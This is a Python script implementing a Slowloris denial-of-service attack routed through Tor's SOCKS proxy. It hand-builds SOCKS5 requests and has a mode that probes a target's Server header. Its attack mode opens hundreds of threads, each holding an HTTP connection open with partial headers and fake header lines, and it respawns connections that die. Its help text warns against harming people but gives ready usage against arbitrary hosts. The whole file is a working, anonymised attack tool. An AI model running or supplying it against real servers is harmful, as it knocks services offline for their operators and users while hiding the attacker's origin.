import socket,time,random,threading,sys

class TorProxyException(Exception):
    '''The Exception class for proxy errores'''

class Generic_Tor:
    #This class is a generic class to communicate with Tor's SOCKS proxy, or any other proxy for that matter.

    def __init__(self,IP="127.0.0.1",Port=9050):
        self.ip =IP # The Tor SOCKS proxy is a loopback proxy 
        self.port=Port # it usually listens on port 9050
        self.session = socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)

    def HandShack(self):
        message=b'\x05\x01\x00'
        #the 1st bit of the message is the version 
        #the 2nd bit is number of methods
        #the 3rd is the authentication method
        self.session.connect((self.ip,self.port))
        self.session.send(message)

        reply =self.session.recv(1024)
        if reply.__len__() == 0:
            raise TorProxyException("Unknown proxy error")
        if reply[1]==255:
            raise TorProxyException("The Authentication method is not valid")
            # As far as i know Tor's SOCKS proxy does not support any Authentication method
            # except password/username method 

    def RequestDetails(self,address,port=80,address_type_IP4=True):
        AddressType=b'\x01'
        #The message must contain a byte which indicates what kind of address is going to be used
        #x01 for IPv4, x03 for fully qualified domain name and x04 for IPv6

        if address_type_IP4 == False:
            if address.__len__()  > 255:
                raise ValueError("Address too long")
            AddressType=b'\x03'
            AddressLength=address.__len__().to_bytes(length=1,byteorder="big")
            address=AddressLength + address.encode("ASCII")
            #If the address is a FQDN then the first byte must contain its length.
        else:
            try:
                address = socket.inet_aton(address) #raises an OSError if the IP is not valid
                #Converting the IP to bytes
            except OSError:
                raise ValueError("Unvalid IP4 address")
        try:
            port =port.to_bytes(length=2,byteorder="big",signed=False)#raises an OverflowError if the port is out of range
            #Converting the port to bytes
        except OverflowError:
            raise ValueError("Unvalid port number")

        message = b'\x05\x01\x00'+AddressType+address+port
        #The 1st byte is the version
        #The 2nd command
        #The 3rd is reserved
        #The 4th is AddressType
        self.session.send(message)

        reply =self.session.recv(1024)
        if reply[1]==1:
            raise TorProxyException("General SOCKS server failure")
        if reply[1]==2:
            raise TorProxyException("Connection not allowed by ruleset")
        if reply[1]==3:
            raise TorProxyException("Network unreachable")
        if reply[1]==4:
            raise TorProxyException("Host unreachable")
        if reply[1]==5:
            raise TorProxyException("Connection refused")
        if reply[1]==6:
            raise TorProxyException("TTL expired")
        if reply[1]==7:
            raise TorProxyException("Command not supported")
        if reply[1]==8:
            raise TorProxyException("Address type not supported")
        if reply[1]>=9:
            raise TorProxyException("Unknown proxy error")

    def send(self,buffer):
        self.session.send(buffer)

    def recv(self):
        reply =self.session.recv(1024)
        return reply

    def close(self):
        self.session.close()
'''The following exceptions: ValueError,socket.error and TorProxyException should be catched'''

#####|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||####

def CheckServer(target_address,target_port,IP4=True):
    RequestLine="GET / HTTP/1.1\r\n".encode("utf8")
    Headers="Host: {}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".format(target_address).encode("utf8")
    TorSession=Generic_Tor()
    try:
        TorSession.HandShack()
        TorSession.RequestDetails(target_address,target_port,address_type_IP4=IP4)
        TorSession.send(RequestLine+Headers)
        reply= TorSession.recv().decode("utf8")
        try:
            temp=reply [ reply.index("Server:") : (reply.__len__()-1)]
            print(temp[0:temp.index("\r\n")] )
        except ValueError as err:
            print("Unknowen Server\r\n")
        TorSession.close()
    
    except (ValueError,TorProxyException,socket.error) as err:
        print(err)

###################

#The actual attack function 
def SlowLoris(target_address,target_port,IP4=True):
    global FatalErrorFlag
    RequestLine="GET / HTTP/1.1\r\n".encode("utf8")
    Headers="Host: {}\r\nUser-Agent: Mozilla/5.0\r\n".format(target_address).encode("utf8")
    TorSession=Generic_Tor()
    try:
        TorSession.HandShack()
        TorSession.RequestDetails(target_address,target_port,address_type_IP4=IP4)

        TorSession.send(RequestLine)
        print("Attack line....is alive")
        TorSession.send(Headers)
        time.sleep(10)#Sending the real headers and sleeping
        
        while True:
            FakeHeader="A-z: {}\r\n".format(random.randint(100,5000)).encode("utf8")
            TorSession.send(FakeHeader)
            time.sleep(15)
        TorSession.recv()

    except (ValueError,TorProxyException) as err:
        FatalErrorFlag=True
        print(err)
        sys.exit()
    except socket.error:
        try:
            th=threading.Thread(target=SlowLoris,args=(target_address,target_port,IP4),daemon=False)
            th.start()
            print("Attack line died...a new one created!")
            sys.exit()
        except Exception as err:
            print(err)
            sys.exit()

#############################

def args_contorol():
    global TargetAddress,TargetPort,Ip4,AttackLines
    Help=''' 
                """"""""" DO NOT USE THIS TO HARM PEOPLE """""""""
                           Slowloris attack through Tor
             
             Usage:
                    slowloris.py -A|attack <ip4> <port> [(-L|lines) <X>]
                    slowloris.py -C|check <ip4> <port>
                    slowloris.py -A|attack -D <domain> <port> [(-L|lines) <X>]
                    slowloris.py -C|check -D <domain> <port>
                    slowloris.py -h|--help
                    
            Commands & Options:

                    -A|attack     Launch the actual attack
                    -C|check      Check what kind of servers you are dealing with
                    -D            To indicate that you are using a domain name
                    -L|lines      Number of attack lines (default:500)
            
            Examples:

                    slowloris.py -A 192.168.0.0 80 -L 5000
                    slowloris.py -A -D www.example.com 80 -L 5000
                    slowloris.py -C 192.168.0.0 80 
                    slowloris.py -C -D www.example.com 80
                    '''
    args= sys.argv
    args.pop(0)
    try:
        if args[0]=="--help" or args[0]=="-h":
            print(Help)
            sys.exit()
        if args[0]=="attack" or args[0]=="-A":
            if args[1]=="-D":
                if args.__len__()==6 and (args[4]=="-L" or args[4]=="lines"):
                    TargetAddress =args[2]
                    TargetPort=int(args[3])
                    AttackLines=int(args[5])
                    Ip4=False
                    return
                if args.__len__()==4:
                    TargetAddress =args[2]
                    TargetPort=int(args[3])
                    Ip4=False
                    return
                else:
                    print(Help)
                    sys.exit()
            else:
                if args.__len__()==5 and (args[3]=="-L" or args[3]=="lines"):
                    TargetAddress =args[1]
                    TargetPort=int(args[2])
                    AttackLines=int(args[4])
                    Ip4=True
                    return
                if args.__len__()==3:
                    TargetAddress =args[1]
                    TargetPort=int(args[2])
                    Ip4=True
                    return
                else:
                    print(Help)
                    sys.exit()
                    
        if args[0]=="check" or args[0]=="-C":
            if args[1]=="-D" and args.__len__()==4:
                CheckServer(args[2],int(args[3]),IP4=False)
                sys.exit()
            if args.__len__()==3:
               CheckServer(args[1],int(args[2]),IP4=True) 
               sys.exit()
            else:
                print(Help)
                sys.exit()
        else:
            print(Help)
            sys.exit()
    except Exception:
        print(Help)
        sys.exit()



#||||||||||||||||||||||||||\main/|||||||||||||||||||||||||||||
FatalErrorFlag=False
TargetAddress=""
TargetPort=0
Ip4=True
AttackLines=500
try:
    args_contorol()
    for i in range(AttackLines):
        th=threading.Thread(target=SlowLoris,args=(TargetAddress,TargetPort,Ip4),daemon=False)
        th.start()
        if FatalErrorFlag==True:
            sys.exit()
            #This workaround had to be done, because Python -as far as i know- does not support  
            #catching exceptions from the caller thread (the main thread in our case)
        time.sleep(5)
except Exception as err :
    print(err)
    sys.exit()
